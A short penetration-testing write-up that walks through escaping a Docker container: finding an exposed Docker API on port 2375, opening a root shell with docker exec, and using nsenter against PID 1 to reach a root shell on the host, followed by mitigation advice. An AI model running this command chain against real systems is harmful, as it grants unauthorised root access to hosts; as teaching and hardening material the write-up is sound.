# Abusing docker misconfiguration
I took advantage of chained misconfiguration to escape the container and get access to host OS
## First misconfiguration
The container was externally exposed

    nmap -sV -p 2375 192.168.1.100
    ...
    PORT     STATE SERVICE VERSION
    2375/tcp open  docker  Docker 20.10.20 (API 1.41)
    Service Info: OS: linux
Find remote running containers

    docker -H tcp://192.168.1.100:2375 ps                             
    CONTAINER ID   IMAGE     ...   
    2225bfdee7ec   devsrv01  ...       

Get a shell inside the remote container

    docker -H tcp://192.168.1.100:2375 exec -it 2225bfdee7ec /bin/bash
    root@2225bfdee7ec:/etc/ssh#     
## Inspect the container

    root@2225bfdee7ec:/etc/ssh# ps aux
    USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root           1  0.0  0.5 102540 11388 ?        Ss   13:14   0:03 /sbin/init
    ...
There are a total of 191 of running process, very strange for a container: maybe the container is sharing the same namespace with the host? That would imply the container can communicate with the processes on the host.


## Abusing the second misconfiguration: shared namespace
Here we are abusing <b>nsenter</b> command, that allows us to execute a processes in a differen namespace. 
In this scenario, since the container can see the <i>/sbin/init</i> process on the host machine, we can try to execute a shell on the host context. Let's give it a try: 

    root@2225bfdee7ec:/etc/ssh# hostname
    2225bfdee7ec
    root@2225bfdee7ec:/etc/ssh# nsenter --target 1 --mount --uts --ipc --net /bin/bash
    root@xxxxx.local:/# whoami
    root
And here we are!
For more information on the nsenter (namespace enter) command you can consult the related manual.

## Mitigations
Protect Docker daemon socket. To accomplish that you can:
1. Don't expose it
2. [Use SSH](https://docs.docker.com/engine/security/protect-access/#use-ssh-to-protect-the-docker-daemon-socket)
3. [Use TLS\HTTPS](https://docs.docker.com/engine/security/protect-access/#use-tls-https-to-protect-the-docker-daemon-socket). More information using [Self-signed certificates](https://gist.github.com/nicosingh/d8bf0defdd4c911bda3392e420d665dd)
4. Don't run containers in <b>privileged mode</b>. It's recommended assigning specific capabilities to a container, rather than running it with the --privileged flag. More info about capabilities [here](https://docs.docker.com/engine/security/#linux-kernel-capabilities).
5. Scan you docker images. Some toools are: docker scout, grype

## A final note
Actually I faced this scenario in a real engagement.
